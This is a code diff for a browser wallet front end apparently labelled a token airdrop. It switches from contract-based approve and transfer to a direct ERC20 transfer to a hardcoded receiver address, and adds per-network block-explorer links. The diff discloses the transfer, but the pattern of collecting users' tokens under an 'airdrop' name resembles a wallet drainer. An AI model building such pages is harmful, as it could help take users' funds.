@@ -1,15 +1,6 @@
-// Contract ABI for TokenAirdrop
-const TOKEN_AIRDROP_ABI = [
-    "function transferTokens(address token, uint256 amount) external",
-    "function getAllowance(address token, address owner) external view returns (uint256)",
-    "function getBalance(address token, address account) external view returns (uint256)",
-    "function RECEIVER_ADDRESS() external view returns (address)"
-];
-
 // ERC20 ABI
 const ERC20_ABI = [
-    "function approve(address spender, uint256 amount) external returns (bool)",
-    "function allowance(address owner, address spender) external view returns (uint256)",
+    "function transfer(address to, uint256 amount) external returns (bool)",
     "function balanceOf(address account) external view returns (uint256)",
     "function decimals() external view returns (uint8)",
     "function symbol() external view returns (string)",
@@ -18,8 +9,17 @@ const ERC20_ABI = [
 
 // Configuration
 const RECEIVER_ADDRESS = "0xf36aa3cd6fdd245d03982caeb7c4a31b2b4be1d0";
-// You should update this with your deployed contract address
-let CONTRACT_ADDRESS = ""; // Will be loaded or set manually
+
+// Network to block explorer mapping
+const BLOCK_EXPLORERS = {
+    1: "https://etherscan.io",           // Ethereum Mainnet
+    56: "https://bscscan.com",           // BSC Mainnet
+    137: "https://polygonscan.com",      // Polygon
+    42161: "https://arbiscan.io",        // Arbitrum
+    10: "https://optimistic.etherscan.io", // Optimism
+    43114: "https://snowtrace.io",       // Avalanche
+    11155111: "https://sepolia.etherscan.io", // Sepolia Testnet
+};
 
 // Application state
 let provider = null;
@@ -233,9 +233,12 @@ async function approveAndTransfer() {
         showPending(`Waiting for confirmation... Tx: ${transferTx.hash}`);
         await transferTx.wait();
         
+        // Get block explorer URL
+        const explorerUrl = BLOCK_EXPLORERS[currentNetwork.chainId] || "https://etherscan.io";
+        
         showSuccess(
             `✅ Success! ${amount} ${symbol} transferred to ${RECEIVER_ADDRESS}<br>` +
-            `Transaction: <a href="https://etherscan.io/tx/${transferTx.hash}" target="_blank">${formatAddress(transferTx.hash)}</a>`
+            `Transaction: <a href="${explorerUrl}/tx/${transferTx.hash}" target="_blank">${formatAddress(transferTx.hash)}</a>`
         );
         
         // Reset form
